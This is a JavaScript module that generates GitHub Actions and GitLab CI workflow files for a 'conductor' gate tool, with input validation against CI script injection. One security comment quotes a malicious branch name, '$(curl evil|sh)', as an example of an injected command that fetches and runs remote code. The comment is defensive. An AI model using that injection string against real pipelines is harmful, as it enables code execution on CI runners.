// conductor/lib/ci.mjs — genera el job de CI en el repo del USUARIO (no en el plugin).
// El gate se ejecuta por el COMANDO `conductor` (instalado en CI), nunca por ruta a un fichero del plugin.
// `enginePkg` = paquete instalable del motor (registro interno de la empresa). En local: ya en PATH.

// SEGURIDAD (H11): nombres de paquete/glob validados (sin metacaracteres de shell) y `github.head_ref` NUNCA
// interpolado dentro de un `run:` — un PR desde una rama "$(curl evil|sh)" ejecutaría comandos en el runner
// (Actions script injection / RCE, con permisos security-events/pull-requests). Se pasa por ENV y se CITA.
const _safePkg = (p) => /^[@a-z0-9._/-]+$/i.test(String(p)) ? String(p) : '@conductor/engine';
const _safeGlob = (g) => /^[\w$./*-]+$/.test(String(g)) ? String(g) : 'openspec/changes/$HEAD_REF';

export function githubWorkflow({ enginePkg = '@conductor/engine', changeGlob = 'openspec/changes/$HEAD_REF' } = {}) {
  const pkg = _safePkg(enginePkg), glob = _safeGlob(changeGlob);
  return `name: conductor-gate
on:
  pull_request:
jobs:
  gate:
    runs-on: ubuntu-latest
    permissions: { contents: read, security-events: write, pull-requests: write }
    env:
      # head_ref entra como variable de entorno (dato), NO interpolado en un run: → un nombre de rama
      # malicioso queda como string y nunca se ejecuta. Se cita siempre al usarlo en el comando.
      HEAD_REF: \${{ github.head_ref }}
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: '20' }
      - name: Install conductor engine
        run: npm i -g ${pkg}
      - name: Deterministic SDD gate (SARIF)
        run: conductor gate "${glob}" --format sarif > conductor.sarif || true
      - name: Upload SARIF to code scanning
        uses: github/codeql-action/upload-sarif@v3
        with: { sarif_file: conductor.sarif }
      - name: Fail build on blocking findings
        run: conductor gate "${glob}"
`;
}

export function gitlabCi({ enginePkg = '@conductor/engine' } = {}) {
  const pkg = _safePkg(enginePkg);
  return `conductor-gate:
  image: node:20
  stage: test
  before_script:
    - npm i -g ${pkg}
  script:
    - conductor gate "openspec/changes/$CI_COMMIT_REF_SLUG" --format junit > conductor-junit.xml || true
    - conductor gate "openspec/changes/$CI_COMMIT_REF_SLUG"
  artifacts:
    when: always
    reports:
      junit: conductor-junit.xml
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
`;
}
